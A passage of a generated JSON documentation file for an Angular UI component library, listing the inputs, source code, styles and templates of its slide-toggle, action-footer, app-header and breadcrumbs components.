                    },
            "getSignature": {
              "name": "disabled",
              "type": "boolean",
              "returnType": "boolean",
              "line": 67
            }
          },
                "color": {
                    "name": "color",
                    "setSignature": {
                      "name": "color",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "color",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 83,
                      "jsdoctags": [
                        {
                          "name": "color",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "color",
                    "type": "",
                    "returnType": "ThemePalette",
                    "line": 79
                  }
                },
                "readonly": {
                    "name": "readonly",
                    "setSignature": {
                      "name": "readonly",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 97,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "boolean",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "readonly",
                    "type": "boolean",
                    "returnType": "boolean",
                    "line": 93
                  }
                },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                        "line": 104
                    }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                      "name": "required",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 118,
                      "jsdoctags": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "required",
                    "type": "",
                    "returnType": "",
                    "line": 114
                  }
                },
                "value": {
                    "name": "value",
                    "setSignature": {
                      "name": "value",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 130,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "value",
                    "type": "",
                    "returnType": "",
                    "line": 126
                  }
                }
        },
        "templateData": "<div class=\"sto-slide-toggle\">\r\n  <span class=\"sto-slide-toggle__label\">{{ ctrl.value ? 'Yes' : 'No' }}</span>\r\n  <mat-slide-toggle (click)=\"$event.stopPropagation()\"\r\n                    class=\"sto-slide-toggle__toggler\"\r\n                    [class.sto-slide-toggle__toggler--hide]=\"readonly\"\r\n                    [formControl]=\"ctrl\"\r\n                    [color]=\"color\"></mat-slide-toggle>\r\n</div>\r\n"
      },
      {
        "name": "StoActionFooterComponent",
        "id": "component-StoActionFooterComponent-4f15df4416b2d0c32f5d3d5b48b8e7e69b018ad98c946241281b7e6d0a27a6241c1b17fe4a88585ca06a28a8c2672d9a42beb39403417c941173162de9d50337",
        "file": "libs/common/src/lib/sto-action-footer/sto-action-footer.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-action-footer",
        "styleUrls": [
          "./sto-action-footer.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-action-footer.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "isLoading",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nTriggers if the progressbar should be visible or not.\n",
            "description": "<p>Triggers if the progressbar should be visible or not.</p>\n",
            "line": 22,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "position",
            "defaultValue": "'fixed'",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nHostbinds to style.position. Defaults to \"fixed\", but could be absolute inside a relative container.\n",
            "description": "<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n",
            "line": 33,
            "type": "string",
            "decorators": []
          },
          {
            "name": "shouldAddClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf a class \"sto-has-action-footer\" should be appended to the body-tag.\nThis is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\nDefault true.\n",
            "description": "<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.\nThis is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\nDefault true.</p>\n",
            "line": 28,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "actionFooterClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 17,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-action-footer'"
              }
            ],
            "modifierKind": [
              121
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "ngOnDestroy",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 38,
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngOnInit",
            "args": [],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 44,
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-action-footer",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 17,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n",
        "rawdescription": "\n\nThe action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like \"Save, cancel etc.\nHas a built-in loading/progress bar.\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, Component, HostBinding, Input, OnDestroy, OnInit, Renderer2, ViewEncapsulation } from '@angular/core';\r\n\r\n/**\r\n * The action footer is a fixed footer at the bottom of the viewport.\r\n * Should be used with buttons with actions like \"Save, cancel etc.\r\n * Has a built-in loading/progress bar.\r\n */\r\n@Component({\r\n  selector: 'sto-action-footer',\r\n  templateUrl: './sto-action-footer.component.html',\r\n  styleUrls : ['./sto-action-footer.component.scss'],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class StoActionFooterComponent implements OnInit, OnDestroy  {\r\n  @HostBinding('class.sto-action-footer')\r\n  private actionFooterClass = true;\r\n\r\n  /**\r\n   * Triggers if the progressbar should be visible or not.\r\n   */\r\n  @Input() isLoading: boolean;\r\n  /**\r\n   * If a class \"sto-has-action-footer\" should be appended to the body-tag.\r\n   * This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.\r\n   * Default true.\r\n   */\r\n  @Input() shouldAddClass = true;\r\n\r\n  /**\r\n   * Hostbinds to style.position. Defaults to \"fixed\", but could be absolute inside a relative container.\r\n   */\r\n  @HostBinding('style.position') @Input() position = 'fixed';\r\n\r\n  constructor(private renderer: Renderer2) {\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    if ( this.shouldAddClass ) {\r\n      this.renderer.removeClass(document.body, 'sto-has-action-footer');\r\n    }\r\n  }\r\n\r\n  ngOnInit(): void {\r\n    if ( this.shouldAddClass ) {\r\n      this.renderer.addClass(document.body, 'sto-has-action-footer');\r\n    }\r\n  }\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@use '@angular/material' as mat;\r\n\r\n$footer-height: 69px;\r\n\r\n.sto-action-footer {\r\n\r\n  bottom: 0;\r\n  left: 0;\r\n  width: 100%;\r\n  height: $footer-height;\r\n  min-height: $footer-height;\r\n  z-index: 25;\r\n\r\n  button {\r\n  }\r\n\r\n  &__message {\r\n    line-height: 2.9;\r\n  }\r\n\r\n  &__content {\r\n    padding: 16px 24px;\r\n  }\r\n\r\n  .mat-progress-bar {\r\n    margin-top: -5px;\r\n  }\r\n\r\n}\r\n\r\n.sto-has-action-footer{\r\n  padding-bottom: $footer-height;\r\n}\r\n\r\n",
            "styleUrl": "./sto-action-footer.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "renderer",
              "type": "Renderer2",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 33,
          "jsdoctags": [
            {
              "name": "renderer",
              "type": "Renderer2",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "OnDestroy"
        ],
        "readme": "<h4 id=\"sto-action-footer\">Sto action footer</h4>\n<p>The action footer is a fixed footer at the bottom of the viewport.\nShould be used with buttons with actions like &quot;Save, cancel etc.\nHas a built-in loading/progress bar.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;$isloading | async&quot;&gt;\n    &lt;button (click)=&quot;onClick()&quot;&gt;Submit&lt;/button&gt;\n    &lt;button (click)=&quot;cancel()&quot;&gt;Cancel&lt;/button&gt;\n&lt;/sto-action-footer&gt;</code></pre></div><h5 id=\"isloading\">isLoading</h5>\n<p>Triggers if the progressbar should be visible or not.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [isLoading]=&quot;true&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"shouldaddclass\">shouldAddClass</h5>\n<p>If a class &quot;sto-has-action-footer&quot; should be appended to the body-tag.<br>This is used to calculate correct height by adding padding to the body element as the footer is a fixed element.<br>Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div><h5 id=\"position\">position</h5>\n<p>Hostbinds to style.position. Defaults to &quot;fixed&quot;, but could be absolute inside a relative container.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-action-footer position=&quot;absolute&quot; [shouldAddClass]=&quot;false&quot;&gt;&lt;/sto-action-footer&gt; </code></pre></div>",
        "templateData": "<mat-progress-bar\r\n\t\t*ngIf=\"isLoading\"\r\n\t\tcolor=\"primary\"\r\n\t\tmode=\"indeterminate\"\r\n\r\n></mat-progress-bar>\r\n<div class=\"sto-action-footer__content\">\r\n\t<ng-content></ng-content>\r\n</div>\r\n"
      },
      {
        "name": "StoAppHeaderComponent",
        "id": "component-StoAppHeaderComponent-5c6428eb0e103dca4332a1db928b74aa7f2a8564bbd0c50090132843116bd81e950bf9e8c38bcff8436bb190328693150a8e089c118d9afb9cd98898dc5c1b18",
        "file": "libs/common/src/lib/sto-app-header/sto-app-header.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-app-header",
        "styleUrls": [
          "./sto-app-header.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-app-header.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "breadCrumbs",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nConfiguration used to print out the relevant application breadcrumbs.\n",
            "description": "<p>Configuration used to print out the relevant application breadcrumbs.</p>\n",
            "line": 51,
            "type": "Breadcrumb[]",
            "decorators": []
          },
          {
            "name": "environmentName",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf {@link testEnvironment} is true, this name is printed out centered on the header\n",
            "description": "<p>If {@link testEnvironment} is true, this name is printed out centered on the header</p>\n",
            "line": 36,
            "type": "string",
            "decorators": []
          },
          {
            "name": "homeBreadCrumbConfig",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nConfiguration that determines what to do when clicking the top-level menu icon\n",
            "description": "<p>Configuration that determines what to do when clicking the top-level menu icon</p>\n",
            "line": 46,
            "type": "literal type",
            "decorators": []
          },
          {
            "name": "testEnvironment",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\ntestEnvironment tells the header whether or not to style itself defining a test-environment\n",
            "description": "<p>testEnvironment tells the header whether or not to style itself defining a test-environment</p>\n",
            "line": 31,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "userMenu",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nInput for user information menu.\n",
            "description": "<p>Input for user information menu.</p>\n",
            "line": 41,
            "type": "MatMenuPanel",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "darkmode$",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Observable<boolean>",
            "optional": false,
            "description": "",
            "line": 53,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "isSmall$",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "Observable<boolean>",
            "optional": false,
            "description": "",
            "line": 54,
            "modifierKind": [
              123
            ]
          },
          {
            "name": "menuOpen",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": false,
            "description": "",
            "line": 55,
            "modifierKind": [
              123
            ]
          }
        ],
            "methodsClass": [
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 107,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "toggleMenu",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 76,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "toggleTheme",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 64,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "toggleTypography",
                "args": [
                  {
                    "name": "className",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "optional": true
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 69,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "className",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "optional": true,
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "<p>StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio</p>\n<p>&lt;sto-app-header [homeBreadCrumbConfig]=&quot;{ command: () =&gt; openDrawer() }&quot;\n   [breadCrumbs]=&quot;[{ label: &#39;Planning&#39;, segment: &#39;planning&#39; }]&quot;&gt;\n</sto-app-header></p>\n",
        "rawdescription": "\n\nStoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio\n\n\n<sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\n   [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\n</sto-app-header>\n",
        "type": "component",
        "sourceCode": "import { ChangeDetectionStrategy, ChangeDetectorRef, Component, Input, OnInit, ViewEncapsulation } from '@angular/core';\r\nimport { Breadcrumb } from '../sto-breadcrumbs/breadcrumb';\r\nimport { MatMenuPanel } from '@angular/material/menu';\r\nimport { StoThemeService } from '../theme/theme.service';\r\nimport { typography, TypographyName } from '../theme/models';\r\nimport { fromEvent, Observable } from 'rxjs';\r\nimport { filter, map, take } from 'rxjs/operators';\r\nimport { BreakpointObserver } from '@angular/cdk/layout';\r\n\r\n/**\r\n * StoAppHeaderComponent is used to create an App header toolbar with a common look / feel across our portfolio\r\n *\r\n * @example\r\n *\r\n * <sto-app-header [homeBreadCrumbConfig]=\"{ command: () => openDrawer() }\"\r\n *    [breadCrumbs]=\"[{ label: 'Planning', segment: 'planning' }]\">\r\n * </sto-app-header>\r\n */\r\n@Component({\r\n  selector: 'sto-app-header',\r\n  templateUrl: './sto-app-header.component.html',\r\n  styleUrls: [ './sto-app-header.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class StoAppHeaderComponent implements OnInit {\r\n  /**\r\n   * testEnvironment tells the header whether or not to style itself defining a test-environment\r\n   */\r\n  @Input()\r\n  testEnvironment: boolean;\r\n  /**\r\n   * If {@link testEnvironment} is true, this name is printed out centered on the header\r\n   */\r\n  @Input()\r\n  environmentName: string;\r\n  /**\r\n   * Input for user information menu.\r\n   */\r\n  @Input()\r\n  userMenu: MatMenuPanel;\r\n  /**\r\n   * Configuration that determines what to do when clicking the top-level menu icon\r\n   */\r\n  @Input()\r\n  homeBreadCrumbConfig: { command: () => void };\r\n  /**\r\n   * Configuration used to print out the relevant application breadcrumbs.\r\n   */\r\n  @Input()\r\n  breadCrumbs: Breadcrumb[];\r\n\r\n  public darkmode$: Observable<boolean>;\r\n  public isSmall$: Observable<boolean>;\r\n  public menuOpen: boolean;\r\n\r\n  constructor(\r\n    private themeService: StoThemeService,\r\n    private breakpointObserver: BreakpointObserver,\r\n    private cdr: ChangeDetectorRef\r\n  ) {\r\n  }\r\n\r\n  toggleTheme() {\r\n    const themeName = document.body.classList.contains('sto-dark-theme') ? 'light' : 'dark';\r\n    this.themeService.setTheme(themeName);\r\n  }\r\n\r\n  toggleTypography(className?: string) {\r\n    const small = className === typography.get('small');\r\n    const large = className === typography.get('large');\r\n    const typographyName: TypographyName = small ? 'small' : large ? 'large' : 'medium';\r\n    this.themeService.setTypography(typographyName);\r\n  }\r\n\r\n  toggleMenu(event: MouseEvent) {\r\n    this.menuOpen = !this.menuOpen;\r\n    if ( this.menuOpen ) {\r\n      fromEvent(document, 'click')\r\n        .pipe(\r\n          filter(e => e !== event),\r\n          filter(e => {\r\n            const t = e.target as HTMLElement;\r\n            if ( !t || !t.parentElement ) {\r\n              return true;\r\n            }\r\n            let parent = t;\r\n            let iterations = 0;\r\n            while ( parent.parentElement && iterations < 5 ) {\r\n              if ( parent.classList.contains('mat-menu-trigger') ) {\r\n                return false;\r\n              }\r\n              iterations = iterations + 1;\r\n              parent = parent?.parentElement;\r\n            }\r\n            return true;\r\n          }),\r\n          take(1)\r\n        )\r\n        .subscribe(() => {\r\n          this.menuOpen = false;\r\n          this.cdr.markForCheck();\r\n        });\r\n    }\r\n  }\r\n\r\n  ngOnInit(): void {\r\n    this.darkmode$ = this.themeService.getActiveTheme()\r\n      .pipe(map(theme => theme && theme.name === 'dark'));\r\n    this.isSmall$ = this.breakpointObserver.observe([ '(max-width: 500px)' ]).pipe(map(r => r.matches));\r\n  }\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@use '@angular/material' as mat;\r\n\r\n.sto-header {\r\n  // @include mat.elevation(3);\r\n  border-bottom: 1px solid;\r\n\r\n  display: flex;\r\n  flex: auto;\r\n  flex-direction: row;\r\n  align-items: center;\r\n  position: fixed;\r\n  top: 0;\r\n  width: 100%;\r\n  z-index: 50;\r\n\r\n  .sto-header__actions mat-icon {\r\n    margin: auto;\r\n  }\r\n\r\n  &__form {\r\n    margin: 8px 0 0 40px;\r\n    display: flex;\r\n  }\r\n\r\n  &__environment {\r\n    position: absolute;\r\n    width: 100%;\r\n    left: 0;\r\n    top: 0;\r\n    display: flex;\r\n    pointer-events: none;\r\n\r\n    &--label {\r\n      padding: 4px 8px;\r\n      text-transform: uppercase;\r\n      white-space: nowrap;\r\n      width: fit-content;\r\n      border-radius: 2px;\r\n      position: relative;\r\n      margin: auto;\r\n    }\r\n\r\n  }\r\n\r\n  .small-toggle {\r\n    margin-right: 6px;\r\n  }\r\n\r\n  &__actions {\r\n    display: flex;\r\n    align-items: center;\r\n    margin-right: 8px;\r\n\r\n    &--small {\r\n      flex-direction: column;\r\n      width: 48px;\r\n      height: auto;\r\n      //max-height: 0;\r\n      transform: scale(0);\r\n      opacity: 0;\r\n      transform-origin: top right;\r\n      overflow: hidden;\r\n      position: absolute;\r\n      right: -4px;\r\n      top: 50px;\r\n      z-index: 100;\r\n      border-radius: 2px;\r\n      transition: opacity 200ms linear;\r\n      @include mat.elevation(4);\r\n\r\n      button {\r\n        margin-left: 0 !important;\r\n        margin-right: 0 !important;\r\n      }\r\n\r\n      &--open {\r\n        transform: scale(1);\r\n        opacity: 1;\r\n        //height: auto;\r\n        //max-height: 200px;\r\n      }\r\n    }\r\n\r\n    button {\r\n      margin: 4px;\r\n\r\n      &:first-of-type {\r\n        margin-left: 0;\r\n      }\r\n\r\n      &:last-of-type {\r\n        margin-right: 0;\r\n      }\r\n    }\r\n  }\r\n}\r\n",
            "styleUrl": "./sto-app-header.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "themeService",
              "type": "StoThemeService",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "breakpointObserver",
              "type": "BreakpointObserver",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 55,
          "jsdoctags": [
            {
              "name": "themeService",
              "type": "StoThemeService",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "breakpointObserver",
              "type": "BreakpointObserver",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit"
        ],
        "readme": "<h3 id=\"stoappheader\">StoAppHeader</h3>\n<p>StoAppHeader is used as a header navigation bar, and in combination with StoBreadCrumbs, also allows you to have a trail of your navigation. </p>\n<p>The breadcrumb trail can be limitless in length, but current practice dictates that it only be 2 segments (Application name / Application section)</p>\n<h5 id=\"usage\">Usage</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-app-header [homeBreadCrumbConfig]=&quot;homeInfo&quot;\n[breadCrumbs]=&quot;[...]&quot;\n[testEnvironment]=&quot;true|false&quot;\nenvironmentName=&quot;Acceptance&quot;&gt;\nOther content can be placed here via projection\n&lt;/sto-app-header&gt;</code></pre></div><h5 id=\"inputs\">Inputs</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nhomeBreadCrumbConfig: {command: () =&gt; void};</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nbreadCrumbs: Breadcrumb[];</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\ntestEnvironment: boolean; // Should the navbar display as testenvironment</code></pre></div><div><pre class=\"line-numbers\"><code class=\"language-javascript\">&#64;Input()\nenvironmentName: string; // Name to be displayed as the active env (e.g acceptance, Systemtest etc)</code></pre></div><h5 id=\"additional-values\">Additional values</h5>\n<div><pre class=\"line-numbers\"><code class=\"language-javascript\">interface Breadcrumb {\n    label: string;\n    command?: Function;\n    segment?: string;\n}</code></pre></div>",
        "templateData": "<div class=\"sto-header\"\r\n     [class.sto-header--test-environment]=\"testEnvironment\">\r\n  <sto-breadcrumbs [home]=\"homeBreadCrumbConfig\"\r\n                   [model]=\"breadCrumbs\"></sto-breadcrumbs>\r\n  <ng-content select=\".sto-header__form\">\r\n  </ng-content>\r\n  <div class=\"sto-header__environment\"\r\n       *ngIf=\"testEnvironment && environmentName && (isSmall$ | async) === false\">\r\n    <div class=\"sto-header__environment--label\">\r\n      {{environmentName}}\r\n    </div>\r\n  </div>\r\n  <span class=\"spacer\"></span>\r\n  <button mat-icon-button\r\n          class=\"small-toggle\"\r\n          *ngIf=\"isSmall$ | async\"\r\n          (click)=\"toggleMenu($event)\">\r\n    <mat-icon>more_vert</mat-icon>\r\n  </button>\r\n  <div class=\"sto-header__actions\"\r\n       [class.sto-header__actions--small--open]=\"menuOpen\"\r\n       [class.sto-header__actions--small]=\"isSmall$ | async\">\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            title=\"Accessibility\"\r\n            [matMenuTriggerFor]=\"menu\">\r\n      <mat-icon>accessibility</mat-icon>\r\n    </button>\r\n    <button mat-icon-button\r\n            title=\"Account\"\r\n            *ngIf=\"userMenu\"\r\n            [matMenuTriggerFor]=\"userMenu\">\r\n      <mat-icon>account_circle</mat-icon>\r\n    </button>\r\n  </div>\r\n</div>\r\n\r\n<mat-menu #menu=\"matMenu\"\r\n          [yPosition]=\"(isSmall$ | async) ? 'above' : 'below'\">\r\n  <button mat-menu-item\r\n          class=\"dense\"\r\n          (click)=\"toggleTheme()\">\r\n    <mat-icon>{{ (darkmode$ | async) ? 'wb_sunny' : 'nights_stay' }}</mat-icon>\r\n    {{(darkmode$ | async) ? 'Disable' : 'Enable'}} night mode\r\n  </button>\r\n  <button mat-menu-item\r\n          class=\"dense\"\r\n          [matMenuTriggerFor]=\"fontMenu\">\r\n    <mat-icon>format_size</mat-icon>\r\n    Font size\r\n  </button>\r\n</mat-menu>\r\n<mat-menu #fontMenu=\"matMenu\">\r\n  <button mat-menu-item\r\n          class=\"dense\"\r\n          style=\"font-size: 10px\"\r\n          (click)=\"toggleTypography('sto-sm-typography')\">\r\n    Smaller\r\n  </button>\r\n  <button mat-menu-item\r\n          class=\"dense\"\r\n          style=\"font-size: 13px\"\r\n          (click)=\"toggleTypography()\">\r\n    Regular\r\n  </button>\r\n  <button mat-menu-item\r\n          class=\"dense\"\r\n          style=\"font-size: 16px\"\r\n          (click)=\"toggleTypography('sto-l-typography')\">\r\n    Larger\r\n  </button>\r\n</mat-menu>\r\n"
      },
      {
        "name": "StoBreadcrumbsComponent",
        "id": "component-StoBreadcrumbsComponent-bb98b10b6c867a59bc694a5efb2d8ccf61fba6383e14e4b75013d01e8965bc6c97c5211ead771ce6bf404bc91dd9d8d2ca8ce2cda8599fd65efc315bbf273ad6",
        "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.component.ts",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-breadcrumbs",
        "styleUrls": [
          "./sto-breadcrumbs.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-breadcrumbs.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "home",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nAn object that can contain a url segment or a command.\n",
            "description": "<p>An object that can contain a url segment or a command.</p>\n",
            "line": 45,
            "type": "any",
            "decorators": []
          },
          {
            "name": "homeicon",
            "defaultValue": "'apps'",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 38,
            "type": "string",
            "decorators": []
          },
          {
            "name": "homeIcon",
            "defaultValue": "'home'",
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "pos": 1530,
                "end": 1608,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 325,
                "tagName": {
                  "pos": 1531,
                  "end": 1541,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "DEPRECATED"
                },
                "comment": "<p>The material icon that is show top left\n {string}</p>\n"
              }
            ],
            "line": 60,
            "type": "string",
            "decorators": []
          },
          {
            "name": "model",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nA list of items which can be a url segment { segment : 'inventory'} or a command {command: () => {}} .\n",
            "description": "<p>A list of items which can be a url segment { segment : &#39;inventory&#39;} or a command {command: () =&gt; {}} .</p>\n",
            "line": 22,
            "type": "any[]",
            "decorators": []
          },
          {
            "name": "style",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nDEPRECATED\n",
            "description": "<p>DEPRECATED</p>\n",
            "line": 50,
            "type": "any",
            "decorators": []
          },
          {
            "name": "styleClass",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nDEPRECATED\n",
            "description": "<p>DEPRECATED</p>\n",
            "line": 54,
            "type": "string",
            "decorators": []
          },
          {
            "name": "svgIcon",
            "defaultValue": "false",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 40,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "propertiesClass": [
          {
            "name": "_model",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "any[]",
            "optional": false,
            "description": "",
            "line": 34,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "css",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 32,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-breadcrumb'"
              }
            ]
          },
          {
            "name": "iconConfig",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "literal type",
